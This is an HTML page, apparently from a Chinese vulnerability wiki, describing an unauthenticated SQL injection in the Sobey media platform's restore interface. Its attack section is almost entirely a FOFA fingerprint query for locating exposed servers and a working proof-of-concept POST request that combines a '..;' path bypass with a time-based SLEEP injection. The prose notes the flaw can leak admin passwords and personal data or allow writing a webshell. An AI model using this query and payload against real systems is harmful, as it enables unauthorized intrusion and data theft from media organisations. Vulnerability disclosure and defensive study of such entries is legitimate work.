@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%88%90%E9%83%BD%E7%B4%A2%E8%B4%9D%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80/%E7%B4%A2%E8%B4%9D%E8%9E%8D%E5%AA%92%E4%BD%93restore%20%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>索贝融媒体restore存在SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7d22\u8d1d\u878d\u5a92\u4f53restore\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%B4%A2%E8%B4%9D%E8%9E%8D%E5%AA%92%E4%BD%93search%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%B4%A2%E8%B4%9D%E8%9E%8D%E5%AA%92%E4%BD%93search%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        索贝融媒体search存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%88%90%E9%83%BD%E4%BF%A1%E9%80%9A%E7%BD%91%E6%98%93%E5%8C%BB%E7%96%97%E7%A7%91%E6%8A%80%E5%8F%91%E5%B1%95%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/PACS%E7%B3%BB%E7%BB%9F/%E6%88%90%E9%83%BD%E4%BF%A1%E9%80%9A%E7%BD%91%E6%98%93%E5%8C%BB%E7%96%97%E7%A7%91%E6%8A%80%E5%8F%91%E5%B1%95%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8PACS%28%E5%8C%BB%E5%AD%A6%E5%BD%B1%E5%83%8F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%29%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%88%90%E9%83%BD%E4%BF%A1%E9%80%9A%E7%BD%91%E6%98%93%E5%8C%BB%E7%96%97%E7%A7%91%E6%8A%80%E5%8F%91%E5%B1%95%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/PACS%E7%B3%BB%E7%BB%9F/%E6%88%90%E9%83%BD%E4%BF%A1%E9%80%9A%E7%BD%91%E6%98%93%E5%8C%BB%E7%96%97%E7%A7%91%E6%8A%80%E5%8F%91%E5%B1%95%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8PACS%28%E5%8C%BB%E5%AD%A6%E5%BD%B1%E5%83%8F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%29%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)存在未授权访问漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="restoresql">索贝融媒体restore存在SQL注入漏洞<a class="headerlink" href="#restoresql" title="Permanent link">&para;</a></h1>
+<p>索贝融媒体产品是成都索贝数码科技股份有限公司（简称索贝）为各级电视台和媒体机构打造的一套集互联网和电视融合生产的解决方案。索贝融媒体 mch/WXArticleInt/restore 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">icon_hash</span><span class="o">=</span><span class="s2">&quot;689611853&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">sobey</span><span class="o">-</span><span class="nx">mchEditor</span><span class="o">/</span><span class="nx">js</span><span class="o">/</span><span class="p">..;</span><span class="err">/mch/WXArticleInt/restore HTTP/1.1</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="nx">example</span><span class="p">.</span><span class="nx">com</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">78</span>
+
+<span class="nx">siteCode</span><span class="o">=&amp;</span><span class="nx">id</span><span class="o">=</span><span class="mf">1</span><span class="o">+</span><span class="nx">AND</span><span class="o">+%</span><span class="mf">28</span><span class="nx">SELECT</span><span class="o">+</span><span class="mf">2804</span><span class="o">+</span><span class="nx">FROM</span><span class="o">+%</span><span class="mf">28</span><span class="nx">SELECT</span><span class="o">%</span><span class="mf">28</span><span class="nx">SLEEP</span><span class="o">%</span><span class="mf">285</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">29</span><span class="nx">MDfc</span><span class="o">%</span><span class="mf">29</span><span class="o">&amp;</span><span class="nx">token</span><span class="o">=</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%B4%A2%E8%B4%9D%E8%9E%8D%E5%AA%92%E4%BD%93search%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%B4%A2%E8%B4%9D%E8%9E%8D%E5%AA%92%E4%BD%93search%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        索贝融媒体search存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%88%90%E9%83%BD%E4%BF%A1%E9%80%9A%E7%BD%91%E6%98%93%E5%8C%BB%E7%96%97%E7%A7%91%E6%8A%80%E5%8F%91%E5%B1%95%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/PACS%E7%B3%BB%E7%BB%9F/%E6%88%90%E9%83%BD%E4%BF%A1%E9%80%9A%E7%BD%91%E6%98%93%E5%8C%BB%E7%96%97%E7%A7%91%E6%8A%80%E5%8F%91%E5%B1%95%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8PACS%28%E5%8C%BB%E5%AD%A6%E5%BD%B1%E5%83%8F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%29%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%88%90%E9%83%BD%E4%BF%A1%E9%80%9A%E7%BD%91%E6%98%93%E5%8C%BB%E7%96%97%E7%A7%91%E6%8A%80%E5%8F%91%E5%B1%95%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/PACS%E7%B3%BB%E7%BB%9F/%E6%88%90%E9%83%BD%E4%BF%A1%E9%80%9A%E7%BD%91%E6%98%93%E5%8C%BB%E7%96%97%E7%A7%91%E6%8A%80%E5%8F%91%E5%B1%95%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8PACS%28%E5%8C%BB%E5%AD%A6%E5%BD%B1%E5%83%8F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%29%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)存在未授权访问漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
